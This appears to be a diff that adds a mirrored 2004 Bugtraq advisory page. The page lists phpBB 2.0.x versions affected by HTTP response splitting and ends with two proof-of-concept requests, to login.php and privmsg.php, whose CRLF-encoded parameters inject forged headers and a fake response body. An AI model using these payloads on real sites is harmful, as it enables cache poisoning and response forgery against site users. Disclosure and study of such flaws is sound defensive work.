@@ -1,0 +1,209 @@
+#SpeeDr00t@Black Falcon<br>#bid10753<p><b><span style="font-size: 18pt;">PHPBB Multiple HTTP Response Splitting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10753/info">info</a><br><a href="http://www.securityfocus.com/bid/10753/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10753/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10753/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10753/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10753
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 19 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 19 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these vulnerabilities is credited to Ory Segal &lt;ory.segal@sanctuminc.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					phpBB Group phpBB 2.0.9 <br/>
+					
+				
+					phpBB Group phpBB 2.0.8 a<br/>
+					
+				
+					phpBB Group phpBB 2.0.8 <br/>
+					
+				
+					phpBB Group phpBB 2.0.7 a<br/>
+					
+				
+					phpBB Group phpBB 2.0.7 <br/>
+					
+				
+					phpBB Group phpBB 2.0.6 d<br/>
+					
+				
+					phpBB Group phpBB 2.0.6 c<br/>
+					
+				
+					phpBB Group phpBB 2.0.6 <br/>
+					
+				
+					phpBB Group phpBB 2.0.5 <br/>
+					
+				
+					phpBB Group phpBB 2.0.4 <br/>
+					
+				
+					phpBB Group phpBB 2.0.3 <br/>
+					
+				
+					phpBB Group phpBB 2.0.2 <br/>
+					
+				
+					phpBB Group phpBB 2.0.1 <br/>
+					
+				
+					phpBB Group phpBB 2.0 .0<br/>
+					
+				
+					phpBB Group phpBB 2.0  RC4<br/>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+					
+				
+					phpBB Group phpBB 2.0  RC3<br/>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+					
+				
+					phpBB Group phpBB 2.0  RC2<br/>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+					
+				
+					phpBB Group phpBB 2.0  RC1<br/>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+					
+				
+					phpBB Group phpBB 2.0  Beta 1<br/>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Software Foundation Apache 1.3.9 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples are available:<br/><br/>REQUEST<br/><br/>POST /phpBB2/login.php HTTP/1.0<br/>Host: SERVER<br/>User-Agent: Mozilla/4.7 en (WinNT; I)<br/>Accept-Encoding: gzip<br/>Accept-Language: en<br/>Accept-Charset: iso-8859-1,*,utf-8<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-length: 129<br/><br/>logout=foobar&amp;redirect=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTT<br/>P/1.0%20200%20OK%0d%0aContent-Length:%207%0d%0a%0d%0aGotcha!<br/><br/>RESPONSE<br/><br/>HTTP/1.1 200 OK<br/>Server: Microsoft-IIS/5.0<br/>Date: Wed, 14 Jul 2004 09:48:04 GMT<br/>Content-type: text/html<br/>X-Powered-By: PHP/4.3.4<br/>Set-Cookie: phpbb2mysql_data=a%3A0%3A%7B%7D; expires=Thu, 14-Jul-2005<br/>09:48:04 GMT; path=/<br/>Set-Cookie: phpbb2mysql_sid=b389d63f8226cc6c8ad349b3aadf41f3; path=/<br/>Refresh: 0; URL=http://SERVER/phpBB2foobar<br/>Content-Length: 0<br/><br/>HTTP/1.0 200 OK<br/>Content-Length: 7<br/><br/>Gotcha!<br/><br/>REQUEST<br/><br/>GET /phpBB2/privmsg.php?mode=foobar%0d%0aContent-Length:%200%0d%0a%0d<br/>%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%207%0d%0a%0d%0aGotcha!<br/>HTTP/1.0<br/>Proxy-Connection: Keep-Alive<br/>User-Agent: Mozilla/4.7 en (WinNT; I)<br/>Host: SERVER<br/><br/>RESPONSE<br/><br/>HTTP/1.1 200 OK<br/>Server: Microsoft-IIS/5.0<br/>Date: Wed, 14 Jul 2004 12:42:17 GMT<br/>Content-type: text/html<br/>X-Powered-By: PHP/4.3.4<br/>Set-Cookie: phpbb2mysql_data=a%3A0%3A%7B%7D; expires=Thu, 14-Jul-2005<br/>12:42:17 GMT; path=/<br/>Set-Cookie: phpbb2mysql_sid=74d20cacbfcd9d7b16e0bb86a345aea3; path=/<br/>Refresh: 0; URL=http://SERVER/phpBB2login.php?redirect=privmsg<br/>.php&amp;folder=inbox&amp;mode=foobar<br/>Content-Length: 0<br/><br/>HTTP/1.0 200 OK<br/>Content-Length: 7<br/><br/>Gotcha!&amp;sid=74d20cacbfcd9d7b16e0bb86a345aea3
+	
+		<ul>
+</ul>
+</div>
